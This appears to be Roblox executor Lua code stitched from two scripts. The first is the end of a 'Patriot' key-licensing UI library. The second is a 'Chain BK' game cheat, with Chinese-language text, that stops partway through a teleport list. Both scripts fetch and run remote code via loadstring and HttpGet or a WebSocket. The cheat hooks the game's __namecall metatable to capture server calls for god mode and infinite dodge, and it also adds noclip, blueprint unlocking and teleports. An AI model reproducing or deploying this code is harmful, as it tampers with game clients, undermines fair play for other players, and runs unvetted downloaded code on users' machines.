    userIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
    userIcon.AnchorPoint = Vector2.new(0.5, 0.5)
    userIcon.BackgroundTransparency = 1
    userIcon.Image = getIcon("user")
    userIcon.ImageColor3 = getTextDim()
    userIcon.ScaleType = Enum.ScaleType.Fit
    userIcon.Parent = userBtn
    userBtn.MouseEnter:Connect(function() TweenService:Create(userIcon, TweenInfo.new(0.15), {ImageColor3 = getAccent()}):Play() end)
    userBtn.MouseLeave:Connect(function() TweenService:Create(userIcon, TweenInfo.new(0.15), {ImageColor3 = getTextDim()}):Play() end)

    local discordBtn = Instance.new("TextButton")
    discordBtn.Size = UDim2.new(0, 36, 0, 36)
    discordBtn.Position = UDim2.new(0.5, 0, 0, bottomY)
    discordBtn.AnchorPoint = Vector2.new(0.5, 0)
    discordBtn.BackgroundColor3 = getBackground()
    discordBtn.BackgroundTransparency = 0.85
    discordBtn.BorderSizePixel = 0
    discordBtn.Text = ""
    discordBtn.AutoButtonColor = false
    discordBtn.Parent = mainFrame
    Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0, 8)

    local discordIcon = Instance.new("ImageLabel")
    discordIcon.Size = UDim2.new(0, 18, 0, 18)
    discordIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
    discordIcon.AnchorPoint = Vector2.new(0.5, 0.5)
    discordIcon.BackgroundTransparency = 1
    discordIcon.Image = getIcon("discord")
    discordIcon.ImageColor3 = getDiscord()
    discordIcon.ScaleType = Enum.ScaleType.Fit
    discordIcon.Parent = discordBtn
    discordBtn.MouseEnter:Connect(function() TweenService:Create(discordIcon, TweenInfo.new(0.15), {ImageColor3 = getDiscordHover()}):Play() end)
    discordBtn.MouseLeave:Connect(function() TweenService:Create(discordIcon, TweenInfo.new(0.15), {ImageColor3 = getDiscord()}):Play() end)

    local changelogBtn = Instance.new("TextButton")
    changelogBtn.Size = UDim2.new(0, 36, 0, 36)
    changelogBtn.Position = UDim2.new(0.5, 44, 0, bottomY)
    changelogBtn.AnchorPoint = Vector2.new(0.5, 0)
    changelogBtn.BackgroundColor3 = getBackground()
    changelogBtn.BackgroundTransparency = 0.85
    changelogBtn.BorderSizePixel = 0
    changelogBtn.Text = ""
    changelogBtn.AutoButtonColor = false
    changelogBtn.Parent = mainFrame
    Instance.new("UICorner", changelogBtn).CornerRadius = UDim.new(0, 8)

    local changelogIcon = Instance.new("ImageLabel")
    changelogIcon.Size = UDim2.new(0, 18, 0, 18)
    changelogIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
    changelogIcon.AnchorPoint = Vector2.new(0.5, 0.5)
    changelogIcon.BackgroundTransparency = 1
    changelogIcon.Image = getIcon("changelog")
    changelogIcon.ImageColor3 = getTextDim()
    changelogIcon.ScaleType = Enum.ScaleType.Fit
    changelogIcon.Parent = changelogBtn
    changelogBtn.MouseEnter:Connect(function() TweenService:Create(changelogIcon, TweenInfo.new(0.15), {ImageColor3 = getText()}):Play() end)
    changelogBtn.MouseLeave:Connect(function() TweenService:Create(changelogIcon, TweenInfo.new(0.15), {ImageColor3 = getTextDim()}):Play() end)

    if #Patriot.Changelog == 0 then
        changelogBtn.Visible = false
        userBtn.Position = UDim2.new(0.5, -22, 0, bottomY)
        discordBtn.Position = UDim2.new(0.5, 22, 0, bottomY)
    end

    if showShop then
        local shopDivider = Instance.new("Frame")
        shopDivider.Size = UDim2.new(1, 0, 0, shopDividerHeight)
        shopDivider.Position = UDim2.new(0, 0, 1, -shopHeight - shopDividerHeight)
        shopDivider.AnchorPoint = Vector2.new(0, 0)
        shopDivider.BackgroundColor3 = getAccent()
        shopDivider.BackgroundTransparency = 0.4
        shopDivider.BorderSizePixel = 0
        shopDivider.Parent = mainFrame

        local shopFrame = Instance.new("Frame")
        shopFrame.Size = UDim2.new(1, 0, 0, shopHeight)
        shopFrame.Position = UDim2.new(0, 0, 1, -shopHeight)
        shopFrame.AnchorPoint = Vector2.new(0, 0)
        shopFrame.BackgroundColor3 = getHeader()
        shopFrame.BackgroundTransparency = 0.85
        shopFrame.BorderSizePixel = 0
        shopFrame.ClipsDescendants = true
        shopFrame.Parent = mainFrame

        local shopCorner = Instance.new("UICorner", shopFrame)
        shopCorner.CornerRadius = UDim.new(0, 12)

        local shopTopFix = Instance.new("Frame")
        shopTopFix.Size = UDim2.new(1, 0, 0, 8)
        shopTopFix.Position = UDim2.new(0, 0, 0, 0)
        shopTopFix.BackgroundColor3 = getHeader()
        shopTopFix.BackgroundTransparency = 0.85
        shopTopFix.BorderSizePixel = 0
        shopTopFix.Parent = shopFrame

        local shopPadding = 14
        local shopIconSize = 28

        local shopIconWrapper = Instance.new("Frame")
        shopIconWrapper.Size = UDim2.new(0, shopIconSize + 4, 0, shopIconSize + 4)
        shopIconWrapper.Position = UDim2.new(0, shopPadding, 0.5, 0)
        shopIconWrapper.AnchorPoint = Vector2.new(0, 0.5)
        shopIconWrapper.BackgroundColor3 = getAccent()
        shopIconWrapper.BackgroundTransparency = 0.7
        shopIconWrapper.BorderSizePixel = 0
        shopIconWrapper.Parent = shopFrame
        Instance.new("UICorner", shopIconWrapper).CornerRadius = UDim.new(0, 6)

        local shopIconStroke = Instance.new("UIStroke", shopIconWrapper)
        shopIconStroke.Color = getAccent()
        shopIconStroke.Thickness = 1
        shopIconStroke.Transparency = 0.5

        local shopIconImg = Instance.new("ImageLabel")
        shopIconImg.Size = UDim2.new(0, shopIconSize, 0, shopIconSize)
        shopIconImg.Position = UDim2.new(0.5, 0, 0.5, 0)
        shopIconImg.AnchorPoint = Vector2.new(0.5, 0.5)
        shopIconImg.BackgroundTransparency = 1
        shopIconImg.Image = getShopIcon()
        shopIconImg.ImageColor3 = getText()
        shopIconImg.ScaleType = Enum.ScaleType.Fit
        shopIconImg.Parent = shopIconWrapper

        local buyBtnWidth = 60
        local textStartX = shopPadding + shopIconSize + 4 + 10
        local textAreaWidth = windowWidth - textStartX - buyBtnWidth - shopPadding - 8

        local shopTitle = Instance.new("TextLabel")
        shopTitle.Size = UDim2.new(0, textAreaWidth, 0, 18)
        shopTitle.Position = UDim2.new(0, textStartX, 0, 9)
        shopTitle.BackgroundTransparency = 1
        shopTitle.Text = Patriot.Shop.Title
        shopTitle.TextColor3 = getText()
        shopTitle.TextSize = mobile and 13 or 14
        shopTitle.Font = Enum.Font.ArimoBold
        shopTitle.TextXAlignment = Enum.TextXAlignment.Left
        shopTitle.TextTruncate = Enum.TextTruncate.AtEnd
        shopTitle.Parent = shopFrame

        local shopSubtitle = Instance.new("TextLabel")
        shopSubtitle.Size = UDim2.new(0, textAreaWidth, 0, 14)
        shopSubtitle.Position = UDim2.new(0, textStartX, 0, 29)
        shopSubtitle.BackgroundTransparency = 1
        shopSubtitle.Text = Patriot.Shop.Subtitle
        shopSubtitle.TextColor3 = getTextDim()
        shopSubtitle.TextSize = mobile and 10 or 11
        shopSubtitle.Font = Enum.Font.ArimoBold
        shopSubtitle.TextXAlignment = Enum.TextXAlignment.Left
        shopSubtitle.TextTruncate = Enum.TextTruncate.AtEnd
        shopSubtitle.Parent = shopFrame

        local buyBtn = Instance.new("TextButton")
        buyBtn.Size = UDim2.new(0, buyBtnWidth, 0, 30)
        buyBtn.Position = UDim2.new(1, -shopPadding, 0.5, 0)
        buyBtn.AnchorPoint = Vector2.new(1, 0.5)
        buyBtn.BackgroundColor3 = getAccent()
        buyBtn.BackgroundTransparency = 0.2
        buyBtn.BorderSizePixel = 0
        buyBtn.Text = ""
        buyBtn.AutoButtonColor = false
        buyBtn.Parent = shopFrame
        Instance.new("UICorner", buyBtn).CornerRadius = UDim.new(0, 6)

        local buyBtnStroke = Instance.new("UIStroke", buyBtn)
        buyBtnStroke.Color = getAccentHover()
        buyBtnStroke.Thickness = 1
        buyBtnStroke.Transparency = 0.4

        local buyContent = Instance.new("Frame")
        buyContent.Size = UDim2.new(1, 0, 1, 0)
        buyContent.BackgroundTransparency = 1
        buyContent.Parent = buyBtn

        local buyLayout = Instance.new("UIListLayout", buyContent)
        buyLayout.FillDirection = Enum.FillDirection.Horizontal
        buyLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        buyLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        buyLayout.Padding = UDim.new(0, 5)

        local buyIcon = Instance.new("ImageLabel")
        buyIcon.Size = UDim2.new(0, 14, 0, 14)
        buyIcon.BackgroundTransparency = 1
        buyIcon.Image = getIcon("cart")
        buyIcon.ImageColor3 = getText()
        buyIcon.ScaleType = Enum.ScaleType.Fit
        buyIcon.LayoutOrder = 1
        buyIcon.Parent = buyContent

        local buyLabel = Instance.new("TextLabel")
        buyLabel.Size = UDim2.new(0, 0, 0, 14)
        buyLabel.AutomaticSize = Enum.AutomaticSize.X
        buyLabel.BackgroundTransparency = 1
        buyLabel.Text = Patriot.Shop.ButtonText
        buyLabel.TextColor3 = getText()
        buyLabel.TextSize = mobile and 11 or 12
        buyLabel.Font = Enum.Font.ArimoBold
        buyLabel.LayoutOrder = 2
        buyLabel.Parent = buyContent

        buyBtn.MouseEnter:Connect(function() TweenService:Create(buyBtn, TweenInfo.new(0.15), {BackgroundColor3 = getAccentHover(), BackgroundTransparency = 0.1}):Play() end)
        buyBtn.MouseLeave:Connect(function() TweenService:Create(buyBtn, TweenInfo.new(0.15), {BackgroundColor3 = getAccent(), BackgroundTransparency = 0.2}):Play() end)
        buyBtn.MouseButton1Click:Connect(function()
            if Patriot.Shop.Link ~= "" then
                pcall(function() setclipboard(Patriot.Shop.Link) end)
                Patriot:Notify("Shop", "Shop link copied to clipboard!", 2, "copy")
            end
        end)
    end

    local doors = CreateDoorOverlay(mainFrame, windowWidth, windowHeight)

    userBtn.MouseButton1Click:Connect(function() ui.toggleUser(userIcon) end)
    changelogBtn.MouseButton1Click:Connect(function() ui.toggleCL(changelogIcon) end)

    local spinConnection, dotsThread

    local function setStatus(state, customText)
        if spinConnection then spinConnection:Disconnect() spinConnection = nil statusIcon.Rotation = 0 end
        if dotsThread then task.cancel(dotsThread) dotsThread = nil end
        local color, icon, text = getStatusIdle(), getIcon("lock"), customText or "No key detected"
        if state == "verifying" then
            color, icon, text = getAccent(), getIcon("loading"), "Verifying key"
            spinConnection = RunService.Heartbeat:Connect(function(dt)
                if statusIcon and statusIcon.Parent then statusIcon.Rotation = (statusIcon.Rotation + dt * 360) % 360
                else if spinConnection then spinConnection:Disconnect() end end
            end)
            local dots, i = {".", "..", "...", ""}, 1
            dotsThread = task.spawn(function()
                while statusLabel and statusLabel.Parent and statusLabel.Text:find("Verifying", 1, true) do
                    statusLabel.Text = text .. dots[i] i = (i % #dots) + 1 task.wait(0.4)
                end
            end)
        elseif state == "success" then color, icon, text = getSuccess(), getIcon("check"), customText or "Access Granted"
        elseif state == "error" then color, icon, text = getError(), getIcon("alert"), customText or "Invalid Key" end
        TweenService:Create(statusLabel, TweenInfo.new(0.3), {TextColor3 = color}):Play()
        TweenService:Create(statusIcon, TweenInfo.new(0.3), {ImageColor3 = color}):Play()
        statusLabel.Text = text statusIcon.Image = icon
    end

    local function closeDoorsThenExit(callback)
        ui.closeAllPanels(userIcon, changelogIcon, function()
            doors.close(function() task.wait(0.3) if callback then callback() end end)
        end)
    end

    closeBtn.MouseButton1Click:Connect(function()
        Patriot:Notify("Goodbye", "Welcome to use it next time!", 2, "close")
        closeDoorsThenExit(function()
            fullCleanup()
            TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
            TweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
            task.wait(0.4) screenGui:Destroy()
            if Patriot.Callbacks.OnClose then Patriot.Callbacks.OnClose() end
        end)
    end)

    local function handleRedeem()
        local key = textBox.Text:gsub("%s+", "")
        if key == "" then Patriot:Notify("Error", "Please enter your key", 3, "warning") return end
        setStatus("verifying") redeemBtn.Active = false task.wait(0.3)
        local valid, errorMsg = false, "Invalid key"
        if Internal.ValidateFunction then
            local success, result, msg = pcall(Internal.ValidateFunction, key)
            if success then
                if type(result) == "table" then
                    valid = result.valid == true
                    local errMsgs = {
                        KEY_INVALID = "Key not found in system", KEY_EXPIRED = "Key has expired",
                        HWID_BANNED = "Hardware banned", KEY_INVALIDATED = "Key was revoked",
                        ALREADY_USED = "One-time key already used", HWID_MISMATCH = "HWID limit reached",
                        SERVICE_NOT_FOUND = "Service not found", SERVICE_MISMATCH = "Wrong service",
                        PREMIUM_REQUIRED = "Premium required", ERROR = "Network error"
                    }
                    local errCode = result.error or "Unknown"
                    errorMsg = errMsgs[errCode] or result.message or errCode
                    if errCode == "HWID_BANNED" then task.delay(2, function() cloneref(Players.LocalPlayer):Kick("Hardware banned") end) end
                elseif type(result) == "boolean" then valid = result errorMsg = msg or "Invalid key" end
            end
        end
        redeemBtn.Active = true
        if valid then
            saveKey(key) getgenv().SCRIPT_KEY = key getgenv().PatriotLoaded = false
            setStatus("success") Patriot:Notify("Success", "Key validated successfully!", 2, "success") task.wait(1)
            closeDoorsThenExit(function()
                disableBlur()
                TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
                TweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
                task.wait(0.4) screenGui:Destroy()
                if not Internal.IsJunkieMode and not Internal.IsWilkinsMode and Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
            end)
        else
            setStatus("error", errorMsg) Patriot:Notify("Invalid", errorMsg, 4, "error")
            if Patriot.Callbacks.OnFail then Patriot.Callbacks.OnFail(errorMsg) end
        end
    end

    redeemBtn.MouseButton1Click:Connect(handleRedeem)
    acquireBtn.MouseButton1Click:Connect(function()
        if Patriot.Links.GetKey ~= "" then Patriot:Notify("Copied", "Key link copied!", 3, "copy") pcall(function() setclipboard(Patriot.Links.GetKey) end)
        else Patriot:Notify("Error", "No key link set", 3, "warning") end
    end)
    discordBtn.MouseButton1Click:Connect(function()
        if Patriot.Links.Discord ~= "" then Patriot:Notify("Discord", "Invite link copied!", 2, "discord") pcall(function() setclipboard(Patriot.Links.Discord) end) end
    end)
    textBox.FocusLost:Connect(function(enter) if enter then handleRedeem() end end)

    setupDragging(header, container)
    TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, 0.45, 0)}):Play()
    task.wait(0.6)
    doors.open(function()
        task.wait(0.2)
        ui.toggleUser(userIcon)
        if #Patriot.Changelog > 0 then task.wait(0.3) ui.toggleCL(changelogIcon) end
    end)
end

-- Public API
function Patriot:Launch()
    Internal.IsJunkieMode = false
    Internal.IsWilkinsMode = false
    Internal.ValidateFunction = Patriot.Callbacks.OnVerify
    local existingKey = getgenv().SCRIPT_KEY
    if existingKey and existingKey ~= "" then
        if existingKey == "KEYLESS" then
            Patriot:Notify("Executed", "Script loaded successfully!", 2, "success")
            if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
        elseif Internal.ValidateFunction and validateKey(existingKey, Internal.ValidateFunction) then
            Patriot:Notify("Executed", "Script loaded successfully!", 2, "success")
            if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
        end
        getgenv().SCRIPT_KEY = nil
    end
    getgenv().PatriotClosed = false
    EnsureIconsReady(function()
        if Patriot.Options.Keyless == true then
            if Patriot.Options.KeylessUI == false then handleKeylessSkip() return end
            BuildKeylessUI()
            while not getgenv().SCRIPT_KEY do task.wait(0.1) end
            return
        end
        if Patriot.Storage.AutoLoad and Internal.ValidateFunction then
            local savedKey = loadKey()
            if savedKey and savedKey ~= "" then
                Patriot:Notify("Checking", "Validating saved key...", 2, "shield") task.wait(0.5)
                if validateKey(savedKey, Internal.ValidateFunction) then
                    getgenv().SCRIPT_KEY = savedKey
                    Patriot:Notify("Welcome Back", "Key validated!", 2, "success")
                    if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
                else clearKey() Patriot:Notify("Expired", "Saved key is no longer valid", 3, "warning") task.wait(1) end
            end
        end
        BuildKeyUI()
        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
    end)
end

function Patriot:LaunchJunkie(config)
    assert(config and config.Service and config.Identifier and config.Provider, "Config required: Service, Identifier, Provider")
    Internal.IsJunkieMode = true
    Internal.IsWilkinsMode = false
    local existingKey = getgenv().SCRIPT_KEY
    if existingKey and existingKey ~= "" then
        Patriot:Notify("Executed", "Script loaded successfully!", 2, "success")
        if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
    end
    getgenv().PatriotClosed = false
    EnsureIconsReady(function()
        local success, Junkie = pcall(function() return loadstring(game:HttpGet("https://jnkie.com/sdk/library.lua"))() end)
        if not success or not Junkie then Patriot:Notify("Error", "Failed to load Junkie SDK", 5, "error") return end
        Junkie.service = config.Service
        Junkie.identifier = config.Identifier
        Junkie.provider = config.Provider
        Internal.Junkie = Junkie
        if Patriot.Links.GetKey == "" then pcall(function() Patriot.Links.GetKey = Junkie.get_key_link() end) end
        Internal.ValidateFunction = function(key) return Junkie.check_key(key) end
        if Patriot.Options.Keyless == nil then
            local ks, kr = pcall(function() return Junkie.check_key("KEYLESS") end)
            if ks and kr and kr.valid then
                if Patriot.Options.KeylessUI == false then handleKeylessSkip() return end
                BuildKeylessUI()
                while not getgenv().SCRIPT_KEY do task.wait(0.1) end
                return
            end
        elseif Patriot.Options.Keyless == true then
            if Patriot.Options.KeylessUI == false then handleKeylessSkip() return end
            BuildKeylessUI()
            while not getgenv().SCRIPT_KEY do task.wait(0.1) end
            return
        end
        if Patriot.Storage.AutoLoad then
            local savedKey = loadKey()
            if savedKey and savedKey ~= "" then
                Patriot:Notify("Checking", "Validating saved key...", 2, "shield") task.wait(0.5)
                local vs, vr = pcall(function() return Junkie.check_key(savedKey) end)
                if vs and vr and vr.valid then
                    getgenv().SCRIPT_KEY = savedKey
                    Patriot:Notify("Welcome Back", "Key validated!", 2, "success")
                    if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
                else clearKey() Patriot:Notify("Expired", "Saved key is no longer valid", 3, "warning") task.wait(1) end
            end
        end
        BuildKeyUI()
        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
    end)
end

function Patriot:LaunchWilkins(config)
    assert(config and config.serviceId, "Config required: serviceId")
    Internal.IsJunkieMode = false
    Internal.IsWilkinsMode = true
    local existingKey = getgenv().SCRIPT_KEY
    if existingKey and existingKey ~= "" then
        Patriot:Notify("Executed", "Script loaded successfully!", 2, "success")
        if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
    end
    getgenv().PatriotClosed = false
    EnsureIconsReady(function()
        local wsCtor = (WebSocket and WebSocket.connect)
            or (syn and syn.websocket and syn.websocket.connect)
            or (websocket and websocket.connect)
        
        if not wsCtor then
            Patriot:Notify("Error", "Executor does not support WebSocket", 5, "error")
            return
        end

        local libCode
        do
            local ws = wsCtor("wss://secure.pandauth.com/ws?type=wilkins-lib")
            ws.OnMessage:Connect(function(msg)
                if msg and #msg > 0 and not libCode then libCode = msg end
            end)
            local deadline = tick() + 15
            repeat task.wait(0.05) until libCode or tick() > deadline
            pcall(function() ws:Close() end)
        end

        if not libCode then
            Patriot:Notify("Error", "Failed to fetch Wilkins library (timeout)", 5, "error")
            return
        end

        local Wilkins = loadstring(libCode)()
        if not Wilkins or type(Wilkins.configure) ~= "function" then
            Patriot:Notify("Error", "Wilkins library failed to initialize", 5, "error")
            return
        end

        local wilkinsConfig = {
            serviceId = config.serviceId,
            debug = config.debug or false,
            kickOnDetect = config.kickOnDetect or false,
            openDashboard = config.openDashboard ~= nil and config.openDashboard or true,
            validationTimeout = config.validationTimeout or 600,
            onTamper = config.onTamper or function(flags)
                warn("[Wilkins] Server flagged tamper:", table.concat(flags or {}, ","))
            end,
            onSessionEnd = config.onSessionEnd or function(reason, msg)
                warn("[Wilkins] Session ended:", reason, msg or "")
            end,
        }
        Wilkins.configure(wilkinsConfig)
        Internal.Wilkins = Wilkins

        Internal.ValidateFunction = function(key)
            local result = Wilkins.validate(key)
            if result and result.success then
                return {valid = true}
            else
                return {valid = false, error = result and result.error or "Unknown error"}
            end
        end

        if Patriot.Links.GetKey == "" then
            pcall(function()
                local info = Wilkins.copyGetKeyUrl()
                if info and info.url then
                    Patriot.Links.GetKey = info.url
                end
            end)
        end

        if Patriot.Options.Keyless == nil then
            local keylessResult = Wilkins.validate("KEYLESS")
            if keylessResult and keylessResult.success then
                if Patriot.Options.KeylessUI == false then
                    handleKeylessSkip()
                    task.spawn(function()
                        while Wilkins.isConnected() do task.wait(5) end
                    end)
                    return
                end
                BuildKeylessUI()
                while not getgenv().SCRIPT_KEY do task.wait(0.1) end
                task.spawn(function()
                    while Wilkins.isConnected() do task.wait(5) end
                end)
                return
            end
        elseif Patriot.Options.Keyless == true then
            if Patriot.Options.KeylessUI == false then
                handleKeylessSkip()
                task.spawn(function()
                    while Wilkins.isConnected() do task.wait(5) end
                end)
                return
            end
            BuildKeylessUI()
            while not getgenv().SCRIPT_KEY do task.wait(0.1) end
            task.spawn(function()
                while Wilkins.isConnected() do task.wait(5) end
            end)
            return
        end

        if Patriot.Storage.AutoLoad then
            local savedKey = Wilkins.loadSavedKey() or loadKey()
            if savedKey and savedKey ~= "" then
                Patriot:Notify("Checking", "Validating saved key...", 2, "shield")
                task.wait(0.5)
                local result = Wilkins.validate(savedKey)
                if result and result.success then
                    getgenv().SCRIPT_KEY = savedKey
                    Patriot:Notify("Welcome Back", "Key validated!", 2, "success")
                    task.spawn(function()
                        while Wilkins.isConnected() do task.wait(5) end
                    end)
                    if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
                    return
                else
                    Wilkins.clearSavedKey()
                    clearKey()
                    Patriot:Notify("Expired", "Saved key is no longer valid", 3, "warning")
                    task.wait(1)
                end
            end
        end

        BuildKeyUI()
        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
        
        task.spawn(function()
            while Internal.Wilkins and Internal.Wilkins.isConnected() do
                task.wait(5)
            end
        end)
    end)
end

function Patriot:GetSavedKey()
    if Internal.IsWilkinsMode and Internal.Wilkins then
        return Internal.Wilkins.loadSavedKey() or loadKey()
    end
    return loadKey()
end

function Patriot:ClearSavedKey()
    if Internal.IsWilkinsMode and Internal.Wilkins then
        Internal.Wilkins.clearSavedKey()
    end
    return clearKey()
end

getgenv().Patriot = Patriot
return Patriot                

local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("SendNotification", {
    Title = "Chain BK",
    Text = "脚本正在加载中",
    Duration = 3
})

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

if not WindUI then
    StarterGui:SetCore("SendNotification", {
        Title = "Chain BK",
        Text = "脚本加载失败",
        Duration = 5
    })
    return
end

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = game:GetService("Lighting")
local UIS = game:GetService("UserInputService")
local W = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local lp = P.LocalPlayer
local Cam = W.CurrentCamera

local aiFolder = W:WaitForChild("Misc"):WaitForChild("AI")
local ScrapFolder = W:WaitForChild("Misc")
	:WaitForChild("Zones")
	:WaitForChild("LootingItems")
	:WaitForChild("Scrap")

local MechanicsFrame = lp:WaitForChild("PlayerGui")
	:WaitForChild("Ingame")
	:WaitForChild("MechanicsFrame")

local GameSections = W:WaitForChild("GameStuff"):WaitForChild("GameSections")
local valuesFolder = W:WaitForChild("GameStuff"):WaitForChild("Values")

local noclipConn = nil
local noclipCache = {}

local function Noclip()
	if State.Noclip then
		if noclipConn then noclipConn:Disconnect() end
		noclipConn = RS.Heartbeat:Connect(function()
			local char = lp.Character
			if not char then return end
			for _, part in ipairs(char:GetDescendants()) do
				if part:IsA("BasePart") then
					if noclipCache[part] == nil then
						noclipCache[part] = part.CanCollide
					end
					part.CanCollide = false
				end
			end
		end)
	else
		if noclipConn then
			noclipConn:Disconnect()
			noclipConn = nil
		end
		for part, orig in pairs(noclipCache) do
			if part and part.Parent then
				part.CanCollide = orig
			end
		end
		noclipCache = {}
	end
end

local function isStationElectrified(station)
	local powerStation = station:FindFirstChild("PowerStation")
	if not powerStation then return false end
	local electricZone = powerStation:FindFirstChild("ElectricZone")
	if not electricZone then return false end
	local danger = electricZone:FindFirstChild("Danger")
	if not danger then return false end
	return danger.Transparency < 0.99 and danger.Visible
end

task.spawn(function()
    local blueprints = lp:WaitForChild("PlayerStats"):WaitForChild("Blueprints")
    local bpDisplay = {
        CombatKnife = "战斗小刀",
        DoubleBarrel = "双管霰弹枪",
        M1911 = "M1911手枪",
        Machete = "砍刀",
        Deagle = "沙漠之鹰",
    }
    for _, name in ipairs({"CombatKnife", "DoubleBarrel", "M1911", "Machete", "Deagle"}) do
        pcall(function()
            if blueprints:GetAttribute(name) ~= nil then
                blueprints:SetAttribute(name, true)
                WindUI:Notify({
                    Title = "蓝图解锁",
                    Content = (bpDisplay[name] or name) .. " 已解锁",
                    Duration = 10,
                    Icon = "check-circle"
                })
                task.wait(0.3)
            end
        end)
    end
    
    local pg = lp:WaitForChild("PlayerGui")
    local ingame = pg:WaitForChild("Ingame")
    local wb = ingame:WaitForChild("Workbench"):WaitForChild("MainFrame"):WaitForChild("Frame"):WaitForChild("Menu"):WaitForChild("Blueprints")
    local bpNames = {"Deagle", "CombatKnife", "DoubleBarrel", "M1911", "Machete"}
    
    local function showBlueprints()
        for _, name in ipairs(bpNames) do
            pcall(function()
                local frame = wb:FindFirstChild(name)
                if frame then
                    frame.Visible = true
                    local lock = frame:FindFirstChild("LockGradient")
                    if lock then lock.Visible = false end
                end
            end)
        end
    end
    
    showBlueprints()
    wb.DescendantAdded:Connect(function(child)
        task.wait(0.1)
        showBlueprints()
    end)
end)

local confirmed = false
local popupSuccess = pcall(function()
    WindUI:Popup({
        Title = "Chain BK",
        IconThemed = true,
        Content = " 脚本免费开源 电脑端T打开/关闭UI 脚本作者：美游 如遇卡顿加载不出来尝试切换加速器或将控制台报错截图发至群内",
        Buttons = {
            {
                Title = "关闭脚本",
                Variant = "Secondary",
                Callback = function() end
            },
            {
                Title = "启动",
                Icon = "check",
                Variant = "Primary",
                Callback = function()
                    confirmed = true
                end
            }
        }
    })
end)

if not popupSuccess then
    warn("Popup 拉取错误，已跳过")
    confirmed = true
end

repeat task.wait() until confirmed

-- ================= 新增：自动无限闪避与无敌核心代码 =================
-- 自动无限闪避
local CTS
local capturingCTS = false
local LastCTSArgs
local dodgeLoop

local function refreshCTS()
    local char = lp.Character
    if not char then return end
    CTS = char:WaitForChild("CharacterMobility"):WaitForChild("CTS")
end

lp.CharacterAdded:Connect(function()
    task.wait(1)
    refreshCTS()
    LastCTSArgs = nil
    if capturingCTS then
        capturingCTS = true
    end
end)

refreshCTS()

-- 无敌
local Interact
local capturingInteract = false
local LastInteractArgs
local godLoop
local lastFire = 0

local function refreshInteract()
    local char = lp.Character
    if not char then return end
    Interact = char:WaitForChild("CharacterHandler"):WaitForChild("Contents"):WaitForChild("Remotes"):WaitForChild("Interact")
end

lp.CharacterAdded:Connect(function()
    task.wait(1)
    refreshInteract()
    LastInteractArgs = nil
    if capturingInteract then
        capturingInteract = true
    end
end)

refreshInteract()

-- Hook __namecall 捕获远程参数
local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
setreadonly(mt, false)
mt.__namecall = function(self, ...)
    local method = getnamecallmethod()
    if method == "FireServer" then
        local args = {...}
        if self == CTS and capturingCTS and not LastCTSArgs then
            LastCTSArgs = args
        elseif self == Interact and capturingInteract and not LastInteractArgs then
            LastInteractArgs = args
        end
    end
    return oldNamecall(self, ...)
end
setreadonly(mt, true)
-- ================= 新增部分结束 =================

local Window = WindUI:CreateWindow({
	Title = "Chain BK",
	Icon = "rbxassetid://75060495367982",
	IconThemed = false,
	Author = "V2.8.2 作者:霞沢",
	Folder = "ChainBK",
	Size = UDim2.fromOffset(800, 700),
	Transparent = true,
	Theme = "Dark",
	Background = "rbxassetid://75060495367982",
	BackgroundImageTransparency = 0.5,
	User = {
		Enabled = true,
		Callback = function() end,
		Anonymous = false
	},
	SideBarWidth = 200,
	ScrollBarEnabled = true,
})

Window:SetToggleKey(Enum.KeyCode.T)

local Tabs = {}

Tabs.FuncTab = Window:Tab({
	Title = "功能",
	Icon = "zap"
})

Tabs.VisualTab = Window:Tab({
	Title = "视觉效果",
	Icon = "eye"
})

Tabs.RemoteTab = Window:Tab({
	Title = "远程UI & 快捷键",
	Icon = "monitor"
})

Tabs.TeleportTab = Window:Tab({
	Title = "传送",
	Icon = "map-pin"
})

Tabs.ServerTab = Window:Tab({
	Title = "转服务器",
	Icon = "server"
})

local TeleportSection = Tabs.TeleportTab:Section({
	Title = "点击传送",
	Opened = true
})

local teleportLocations = {
	{Name = "排行榜", Pos = Vector3.new(41.97792434692383, -97.96876525878906, 353.2716064453125)},
	{Name = "偏远房子", Pos = Vector3.new(-312.85406494140625, -89.67484283447266, 274.7098388671875)},
	{Name = "仓库", Pos = Vector3.new(316.2673645019531, -117.15931701660156, -216.89208984375)},
	{Name = "小屋", Pos = Vector3.new(158.31149291992188, -94.2305679321289, 206.0210418701172)},
	{Name = "祭坛", Pos = Vector3.new(-34.74468231201172, -106.63446807861328, -182.37461853027344)},
	{Name = "帐篷", Pos = Vector3.new(-196.43980407714844, -97.0508041381836, -230.5570831298828)},
	{Name = "发电站", Pos = Vector3.new(-209.9872589111328, -110.8906478881836, -106.05029296875)},
